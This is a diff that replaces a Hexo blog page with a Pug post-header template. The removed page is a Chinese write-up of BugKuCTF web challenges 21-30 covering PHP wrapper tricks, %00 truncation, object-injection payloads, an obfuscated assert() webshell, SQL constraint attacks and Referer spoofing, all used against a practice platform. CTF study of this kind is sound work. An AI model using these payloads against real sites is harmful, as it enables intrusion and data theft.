@@ -1,717 +1,79 @@
+extends includes/layout.pug
 
-<!DOCTYPE html>
-<html lang class="loading">
-<head><meta name="generator" content="Hexo 3.9.0">
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BugKuCTF — Web题(第21-30关) - Knlvre</title>
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate">
-    <meta name="keywords" content="TriDiamond Obsidian,"> 
-    <meta name="description" content="前一部分链接：第11-20关Write-up
-第二十一关（秋名山老司机）题目打开要求我们2秒内快速计算
-
-就想到用Python的Session机制，思想是：自动抓取页面、计算、提交、保存Sessio,"> 
-    <meta name="author" content="Knlvre"> 
-    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
-    <link rel="icon" href="knlvre.github.io/img/favicon.png"> 
-    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
-    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
-    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
-    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
-    <link rel="stylesheet" href="knlvre.github.io/css/obsidian.css">
-    <link rel="stylesheet" href="knlvre.github.io/css/ball-atom.min.css">
-</head>
-</html>
-
-<body class="loading">
-    <div class="loader">
-        <div class="la-ball-atom la-2x">
-            <div></div>
-            <div></div>
-            <div></div>
-            <div></div>
-        </div>
-    </div>
-    <span id="config-title" style="display:none">Knlvre</span>
-    <div id="loader"></div>
-    <div id="single">
-    <div class="scrollbar gradient-bg-rev"></div>
-<div id="top" style="display: block;">
-    <div class="bar" style="width: 0;"></div>
-    <div class="navigation animated fadeIn fast delay-1s">
-        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
-        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">BugKuCTF — Web题(第21-30关)</h3>
-        <div class="social">
-            <!--        <div class="like-icon">-->
-            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
-            <!--        </div>-->
-            <div>
-                <div class="share">
-                    
-                        <a href="javascript:;" class="iconfont icon-share1"></a>
-                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
-                    
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-    <div class="section">
-        <div class=article-header-wrapper>
-    <div class="article-header">
-        <div class="article-cover animated fadeIn" style="
-            animation-delay: 600ms;
-            animation-duration: 1.2s;
-            background-image: 
-                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-                url(http://pic.netbian.com/uploads/allimg/180417/160606-1523952366b027.jpg);">
-        </div>
-        <div class="else">
-            <p class="animated fadeInDown">
-                
-                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
-                
-                March 28, 2019
-            </p>
-            <h3 class="post-title animated fadeInDown"><a href="knlvre.github.io/2019/03/28/BugKuCTF—Web题 第21-30关/" title="BugKuCTF — Web题(第21-30关)">BugKuCTF — Web题(第21-30关)</a>
-            </h3>
-            
-            <p class="post-count animated fadeInDown">
-                
-                <span>
-                    <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    17k
-                </span>
-                
-                
-                <span>
-                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    15 mins.
-                </span>
-                
-                
-                
-                <span id="busuanzi_container_page_pv">
-                    <b class="iconfont icon-read"></b> <i>Read count</i>
-                    <span id="busuanzi_value_page_pv">0</span>
-                </span>
-                
-            </p>
-            
-            
-            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="knlvre.github.io/tags/CTF-Web/">CTF-Web</a></li></ul>
-            
-        </div>
-    </div>
-</div>
-
-<div class="screen-gradient-after">
-    <div class="screen-gradient-content">
-        <div class="screen-gradient-content-inside">
-            <div class="bold-underline-links screen-gradient-sponsor">
-                <p>
-                    <span class="animated fadeIn delay-1s"></span>
-                </p>
-            </div>
-        </div>
-    </div>
-</div>
-
-<div class="article">
-    <div class='main'>
-        <div class="content markdown animated fadeIn">
-            <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/08/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></p>
-<h3 id="第二十一关（秋名山老司机）"><a href="#第二十一关（秋名山老司机）" class="headerlink" title="第二十一关（秋名山老司机）"></a>第二十一关（秋名山老司机）</h3><p>题目打开要求我们2秒内快速计算</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-1.png" alt="2-1"></p>
-<p>就想到用Python的Session机制，思想是：<code>自动抓取页面、计算、提交、保存Session、显示flag</code></p>
-<p>那此时就会碰到一个问题，我们计算好的值，同哪个变量提交给服务器？</p>
-<p>此时，页面多刷新几次，机会看到提示：<code>value</code>变量</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-2.png" alt="2-2"></p>
-<p>-写代码：</p>
-<pre><code class="python">import requests
-import re
-from bs4 import BeautifulSoup
-
-a = requests.Session()
-url = &#39;http://123.206.87.240:8002/qiumingshan/&#39;
-b = a.get(url)
-soup = BeautifulSoup(b.text,&#39;lxml&#39;)
-c = str(re.findall(&#39;&lt;div&gt;(.*)&lt;/div&gt;&#39;,str(soup.find_all(&#39;div&#39;))))[2:-5]
-result = eval(c)
-data = {&#39;value&#39;:result}
-d = a.post(url,data)
-print(d.text)
-</code></pre>
-<p>多执行几次，flag就跳出来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-3.png" alt="1-3"></p>
-<p>为什么要多执行几次呢？看了别人的WP：当计算结果超出一定长度时，服务器就不响应了。在此猜想：可能客户端 Python 脚本计算错误，也可能服务器端 PHP 脚本对大数计算有误差，还可能在 POST 请求过程中令大整数发生改变。至于是哪种，还请高手解答。</p>
-<h3 id="第二十二关（速度要快）"><a href="#第二十二关（速度要快）" class="headerlink" title="第二十二关（速度要快）"></a>第二十二关（速度要快）</h3><p>题目进去提示：<code>我感觉你得快点!!!</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-1.png" alt="2-1"></p>
-<p>查看源代码：<code>margin</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-2.png" alt="2-2"></p>
-<p>使用<code>Burpsuits</code>发送GET请求包，返回的内容里有flag字段，是<code>Base64加密</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-3.png" alt="2-3"></p>
-<p>拿去Notepad++解密一下，还是经过<code>Base64加密</code>，需要再次解密才会变成数字</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-4.png" alt="2-4"></p>
-<p>那么现在这个数字应该就是我们要的值，并且作为变量<code>margin</code>的值提交上去才行</p>
-<p>写代码：</p>
-<pre><code class="python">import base64,requests
-
-a = requests.Session()
-url = &quot;http://123.206.87.240:8002/web6/&quot;
-b = a.get(url)
-b = b.headers[&#39;flag&#39;]
-c = str(base64.b64decode(b))[-9:-1]
-d = base64.b64decode(c)
-result = d.decode()
-data = {&#39;margin&#39;:result}
-
-flag = a.post(url,data=data)
-print(flag.text)
-</code></pre>
-<p>直接拿下flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-5.png" alt="2-5"></p>
-<h3 id="第二十三关（Cookies欺骗）"><a href="#第二十三关（Cookies欺骗）" class="headerlink" title="第二十三关（Cookies欺骗）"></a>第二十三关（Cookies欺骗）</h3><p>链接进去后只看到一串一直重复的文字</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-1.png" alt="3-1"></p>
-<p>但是注意到<code>URL</code>的<code>filename</code>字段后面接的是<code>Base64</code>密文，拿去解密一下是：<code>key.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-2.png" alt="3-2"></p>
-<p>我们将<code>index.php</code>也经过<code>Base64</code>加密，放上去，然后将<code>line</code>参数调成1。嗯？有料</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-3.png" alt="3-3"></p>
-<p>调成2、3试一下，也都有内容</p>
-<p>那就直接写个脚本全部抓下来看</p>
-<pre><code class="python">import requests,base64
-
-s = &quot;index.php&quot;
-s = s.encode()
-s = base64.b64encode(s)
-s = s.decode()
-
-for i in range(30):
-    i = str(i)
-    url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot; + i + &quot;&amp;filename=&quot; + s
-    r = requests.get(url)
-
-    if(r.text):
-        print(r.text[0:-2])
-    else:
-        break
-</code></pre>
-<p>读取如下内容：</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);
-$line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;
-if($file==&#39;&#39;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);
-$file_list = array(
-&#39;0&#39; =&gt;&#39;keys.txt&#39;,
-&#39;1&#39; =&gt;&#39;index.php&#39;,
-);
-
-if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;){
-$file_list[2]=&#39;keys.php&#39;;
-}
-
-if(in_array($file, $file_list)){
-$fa = file($file);
-echo $fa[$line];
-}
-?&gt;
-</code></pre>
-<p>关于<code>问号（?）</code>的用法：</p>
-<pre><code>[表达式] ? [结果1]:[结果2]        //当表达式为True时，返回结果1;当表达式为False时，返回结果2
-</code></pre><p>所以当<code>Cookie</code>中有<code>margin</code>，并且<code>file</code>的值为<code>keys.php的Base64密文</code>时，返回<code>keys.php</code>的值</p>
-<p><code>Burpsuits</code>提交，成功获得<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-5.png" alt="3-5"></p>
-<h3 id="第二十四关（Never-give-up）"><a href="#第二十四关（Never-give-up）" class="headerlink" title="第二十四关（Never give up）"></a>第二十四关（Never give up）</h3><p>链接进去没有提示有用的信息，只显示”never never never give up !!!”</p>
-<p>右键”查看网页源代码”，看到提示信息<code>&lt;!--1p.html--&gt;</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-1.png" alt="4-1"></p>
-<p>我们直接在<code>view-source</code>的后面改成<code>1p.html</code>就可以看到内容</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-2.png" alt="4-2"></p>
-<p>内容显然是经过<code>url编码</code>和<code>Base64加密</code>的，那就直接复制到<code>Notepad++</code>里进行转换</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-3.png" alt="4-3"></p>
-<p>对其中几个函数解释一下：</p>
-<pre><code>stripos()：
-函数查找字符串在另一字符串中第一次出现的位置（不区分大小写），返回一个数字
-
-eregi()：
-用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则返回false
-和 ereg() 完全相同，只除了在匹配字母字符时忽略大小写的区别
-</code></pre><p>开始对源码中<code>$id</code>、<code>$a</code>、<code>$b</code> 三个变量需要满足的条件进行讲解</p>
-<p>一、$id（弱类型比较）</p>
-<p>变量 $id 若想满足非空非零，且弱等于整型数 0，则 $id 的值只能为非空非零字符串</p>
-<p>我们随便设置一个值：$id=bugku，如下图：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-4.png" alt="4-4"></p>
-<p>二、$a（PHP伪协议）</p>
-<p>源码中变量 $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流</p>
-<p>在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。因此这里用伪协议 php:// 来访问输入输出的数据流，其中 php://input可以访问原始请求数据中的只读流。这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform!</p>
-<p>三、$b（eregi()截断漏洞）</p>
-<p>CTF 题做多了就知道 ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。这个漏洞可以用<code>url中空格的编码</code>：<code>%00</code>来绕过</p>
-<p>源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “%00”，即eregi(“111”,”1114”)，满足 “111”去匹配 “1114” 成功。因此，这里假设 $b = “%0012345”，才能满足以上三个条件</p>
-<p>构造<code>payload</code>：</p>
-<pre><code>?id=Bugku&amp;&amp;a=php://input&amp;&amp;b=%0012345
-
-//请求主体中提交字符串：bugku is a nice plateform!
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-5.png" alt="4-5"></p>
-<p>成功拿下flag</p>
-<p>不过此题还有一个更简单的做法。。。。</p>
-<p>直接访问<code>f4l2a3g.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-6.png" alt="4-6"></p>
-<h3 id="第二十五关（welcome-to-bugkuctf）"><a href="#第二十五关（welcome-to-bugkuctf）" class="headerlink" title="第二十五关（welcome to bugkuctf）"></a>第二十五关（welcome to bugkuctf）</h3><p>链接进去没有提示有用信息，只是提示：”you are not the number of bugku !”</p>
-<p>查看源代码，看到了提示</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-1.png" alt="5-1"></p>
-<p>看到<code>file_get_contents()</code>和<code>include()</code>想到之前的知识点，构造<code>payload</code>：</p>
-<pre><code>?txt=php://&amp;&amp;file=php://filter/read=convert.base64-encode//resource=hint.php
-
-//password变量好像暂时用不上，就先不传入了
-//请求主体中提交字符串：welcome to the bugkuctf
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-2.png" alt="5-2"></p>
-<p>将那串<code>Base64</code>拿去解码，得到如下内容</p>
-<pre><code class="php">&lt;?php  
-
-class Flag{//flag.php  
-    public $file;  
-    public function __tostring(){  
-        if(isset($this-&gt;file)){  
-            echo file_get_contents($this-&gt;file); 
-            echo &quot;&lt;br&gt;&quot;;
-        return (&quot;good&quot;);
-        }  
-    }  
-}  
-?&gt;  
-</code></pre>
-<p>现在，直接将<code>$file</code>变量改成<code>flag.php</code>是不行的，会返回一串乱码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-4.png" alt="5-4"></p>
-<p>没有思路后看别人的WriteUp，我们就按照之前的步骤看<code>index.php</code>的源代码</p>
-<p>为什么是<code>index.php</code>呢</p>
-<p>第一：因为这个页面通常是一个网站的关键页面，有重要信息</p>
-<p>第二：在我们给<code>$file</code>变量添加内容后，返回<code>hello friend!</code>，在其他源代码没见过，所以可以猜测有其他内容</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-5.png" alt="5-5"></p>
-<p>把获得的<code>Base64密文</code>拿去解密得到代码</p>
-<pre><code class="php">&lt;?php  
-$txt = $_GET[&quot;txt&quot;];  
-$file = $_GET[&quot;file&quot;];  
-$password = $_GET[&quot;password&quot;];  
-
-if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){  
-    echo &quot;hello friend!&lt;br&gt;&quot;;  
-    if(preg_match(&quot;/flag/&quot;,$file)){ 
-        echo &quot;不能现在就给你flag哦&quot;;
-        exit();  
-    }else{  
-        include($file);   
-        $password = unserialize($password);  
-        echo $password;  
-    }  
-}else{  
-    echo &quot;you are not the number of bugku ! &quot;;  
-}  
-
-?&gt;
-</code></pre>
-<p>观察代码，在第八行时利用了正则匹配，当检测到<code>$file</code>变量中含有<code>flag</code>关键字，返回<code>不能现在就给你flag哦</code>，这应该就是刚才我们得到的乱码。这样的话，$flie变量就不能含有flag才能执行<code>else中的语句</code></p>
-<p>使用<code>include()</code>来处理<code>$file</code>变量，将变量<code>$password</code>进行逆序列化，然后输出<code>$password</code>的值</p>
-<p>回到通过<code>hint.php</code>获得的代码块，<code>Flag类</code>，看到里面有一个$file属性，并且有一个魔术方法<code>_tostring()</code>，这个方法的作用就是当调用实例化对象时就会自动执行<code>_tostring()</code>这个方法。简单来说创造一个这个类的对象就会调用这个方法。而在<code>_tostring()</code>中，会输出以字符串的形式输出<code>$file</code>，根据上面的这些条件，我们可以让$password为<code>Flag</code>类型，并且让FLAG中的$file就等于flag.php，这样我们就可以得到flag.php的内容了，不过要记得，前面$password进行了反序列化的操作，所以我们要先把它序列化。在本地写一个php脚本，来获取<code>$password</code>的值：</p>
-<pre><code class="php">&lt;?php
-class Flag{
-    public $file;
-}
-
-$test = new Flag;
-$test-&gt;file = &#39;flag.php&#39;;
-echo serialize($test);
-?&gt;
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-7.png" alt="5-7"></p>
-<p>现在构造<code>payload</code>：</p>
-<p>这里<code>$file</code>要记得填<code>hint.php</code>，要将这个包含进来才可以，改成其他的会失败，因为失去Flag类</p>
-<pre><code>?txt=php://input&amp;&amp;file=hint.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
-</code></pre><p>通过Burpsuits提交，得到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-8.png" alt="5-8"></p>
-<h3 id="第二十六关（过狗一句话）"><a href="#第二十六关（过狗一句话）" class="headerlink" title="第二十六关（过狗一句话）"></a>第二十六关（过狗一句话）</h3><p>有提示：</p>
-<pre><code class="php">&lt;?php 
-    $poc=&quot;a#s#s#e#r#t&quot;; 
-    $poc_1=explode(&quot;#&quot;,$poc); 
-    $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
-    $poc_2($_GET[&#39;s&#39;]) 
-?&gt;
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-1.png" alt="6-1"></p>
-<p>可以看出<code>$poc_2=assert</code>，也就是<code>$poc_2($_GET[&#39;s&#39;])</code>  = <code>assert($_GET[&#39;s&#39;])</code></p>
-<p>可以利用<code>assert()</code>函数存在<code>代码执行漏洞</code></p>
-<p>数组形式返回当前目录下的文件：</p>
-<pre><code class="php">?s=print_r(scandir(&#39;./&#39;))
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-2.png" alt="6-2"></p>
-<p>注意到其中的一个文件：<code>flag_sm1skla1.txt</code></p>
-<p>直接访问，拿到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-3.png" alt="6-3"></p>
-<h4 id="题外话："><a href="#题外话：" class="headerlink" title="题外话："></a>题外话：</h4><p>可以继续利用这个漏洞，读取其他任意想要读取的文件</p>
-<p>读取上一级目录：</p>
-<pre><code>?s=print_r(scandir(&#39;../&#39;))
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-4.png" alt="6-4"></p>
-<h3 id="第二十七关（字符？正则？）"><a href="#第二十七关（字符？正则？）" class="headerlink" title="第二十七关（字符？正则？）"></a>第二十七关（字符？正则？）</h3><p>链接进去直接看到代码，如下：</p>
-<pre><code class="php">&lt;?php 
-highlight_file(&#39;2.php&#39;);
-$key=&#39;KEY{********************************}&#39;;
-$IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
-if( $IM ){ 
-  die(&#39;key is: &#39;.$key);
-}
-?&gt;
-</code></pre>
-<p>分析一下：</p>
-<pre><code>简单复习一下preg_match()：
-preg_match(string $pattern , string $subject , array $matches)
-
-pattern
-要搜索的模式，字符串类型。
-
-subject
-输入字符串。
-
-matches
-如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。
-</code></pre><pre><code>模式的解释：
-1.表达式直接写出来的字符串直接利用，如key
-2.“.”：代表任意字符
-3.“*”：代表一个或一序列字符重复出现的次数，即前一个字符重复任意次
-4.“\/”：代表“/”
-5.[a-z]：代表a-z中的任意一个字符
-6.[[:punct:]]：代表任意一个各种符号
-7./i：代表大小写不敏感
-8.{4,7}：代表前一个字符，连续出现的次数是4-7次就可以
-</code></pre><p>这样我们就可以的出我们的<code>id</code>的有效值：</p>
-<pre><code>?id=key999key9999key:/9/999keya!
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/7-1.png" alt="7-1"></p>
-<h3 id="第二十八关（前女友-SKCTF-）"><a href="#第二十八关（前女友-SKCTF-）" class="headerlink" title="第二十八关（前女友(SKCTF)）"></a>第二十八关（前女友(SKCTF)）</h3><p>链接打不开，先放着吧</p>
-<h3 id="第二十九关（login1-SKCTF-）"><a href="#第二十九关（login1-SKCTF-）" class="headerlink" title="第二十九关（login1(SKCTF)）"></a>第二十九关（login1(SKCTF)）</h3><p>题目有提示：SQL约束攻击</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-1.png" alt="9-1"></p>
-<p>链接进去后点击”没有账号”，随便注册一个账号。返回登陆时，提示我们”不是管理员还想看flag?!”</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-2.png" alt="9-2"></p>
-<p>那也就是提示我们，管理员才能看flag，那怎么通过管理员的身份去查看flag呢？注册一个管理员账号</p>
-<p>参考博客：<a href="https://blog.csdn.net/qq_42777804/article/details/81866940" target="_blank" rel="noopener">第二十九关WriteUp</a></p>
-<p>首先先说一下<code>SQL约束攻击</code>：</p>
-<ol>
-<li>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说<code>&quot;admin&quot;</code>等同于<code>&quot;admin   &quot;</code>，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名”admin”进行查询时的结果是一样的</li>
-</ol>
-<pre><code>select * from user where username=&#39;admin   &#39;;
-</code></pre><ol start="2">
-<li>在所有的<code>INSERT</code>查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“abcdefg”时，实际上只能插入字符串的前5个字符，即“abcde”</li>
-</ol>
-<p>知道条件的时候，我们就去注册一个账号，用户名为<code>&#39;admin     &#39;</code>（后面接5个空格，空格数量随意），密码符合条件随意就行</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-3.png" alt="9-3"></p>
-<p>然后直接用这个账号去登陆，拿到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-4.png" alt="9-4"></p>
-<p>也就是说，<code>注册</code>时使用<code>INSERT语句</code>帮我们插入一个用户名为<code>&#39;admin     &#39;</code>的账户</p>
-<p><code>登陆</code>时，帮我们删掉了用户名后面的空格，即查询了<code>&#39;admin&#39;</code>用户的信息</p>
-<h3 id="第三十关（你从哪里来）"><a href="#第三十关（你从哪里来）" class="headerlink" title="第三十关（你从哪里来）"></a>第三十关（你从哪里来）</h3><p>链接打开看到提示：<code>&quot;are you from google?&quot;</code></p>
-<p>那么这关考察的是<code>Http Referer</code>：</p>
-<ol>
-<li><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站</p>
-</li>
-<li><p>Referer的正确英语拼法是referrer。由于早期HTTP规范的拼写错误，为了保持向后兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以目前拼法不统一</p>
-</li>
-</ol>
-<p>我们可以自己测试一下，打开<code>https://www.baidu.com</code>，挂上<code>Burpsuits</code>的代理，随便点击一个可点链接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-1.png" alt="10-1"></p>
-<p>看一下Burpsuit中请求头里长什么样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-2.png" alt="10-2"></p>
-<p>果然是有<code>Referer</code>字段的，并且其内容是<code>https://www.baidu.com</code>，这就验证了我们的说法</p>
-<p>那现在开始做题。将请求头加上<code>Referer</code>字段，内容为<code>https://www.google.com</code>，拿下flag</p>
-<pre><code>Referer: https://www.google.com
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-3.png" alt="10-3"></p>
-<hr>
-<p>至此，21-30关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/04/10/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></p>
-
-            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls"
-                data-autoplay="false">
-                <source type="audio/mpeg" src="">
-            </audio>
-            
-            <ul id="audio-list" style="display:none">
-                
-                
-                <li title='0' data-url='knlvre.github.io/statics/chengdu.mp3'></li>
-                
-                    
-            </ul>
-            
-            
-            
-    <div id='gitalk-container' class="comment link"
-        data-ae='true'
-        data-ci='ec894e2b66f752e8b7fb'
-        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
-        data-r='blog-comments'
-        data-o='TriDiamond'
-        data-a='TriDiamond'
-        data-d=''
-    >Comments</div>
+block top_img
+  - var top_img =  page.top_img || page.cover || theme.post_meta.top_img || theme.default_top_img
+  - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+  div#top-container(style=bg_img)
+    #post-info
+      #post-title
+          .posttitle= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          if (theme.post_meta.date_type === 'both')
+            time.post-meta__date
+              i.fa.fa-calendar(aria-hidden="true")
+              =' '+_p('post.created')+' '+date(page.date, config.date_format)
+              span.post-meta__separator |
+              i.fa.fa-history(aria-hidden="true")
+              =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+          else
+            - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+            time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+                  
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator.mobile_hidden |
+          span.mobile_hidden
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right(aria-hidden="true")
+        .post-meta-wordcount
+          if (theme.wordcount && theme.wordcount.enable)
+            i.fa.fa-file-word-o.post-meta__icon(aria-hidden="true")
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            i.fa.fa-clock-o.post-meta__icon(aria-hidden="true")
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+          if (theme.wordcount && theme.wordcount.enable && theme.busuanzi.page_pv)
+            span.post-meta__separator |
+          if theme.busuanzi.page_pv
+            i.fa.fa-eye.post-meta__icon(aria-hidden="true")        
+            span= _p('post.page_pv') + ': '
+            span#busuanzi_value_page_pv
 
 
-            
-            
-        </div>
-        <div class="sidebar">
-            <div class="box animated fadeInRight">
-                <div class="subbox">
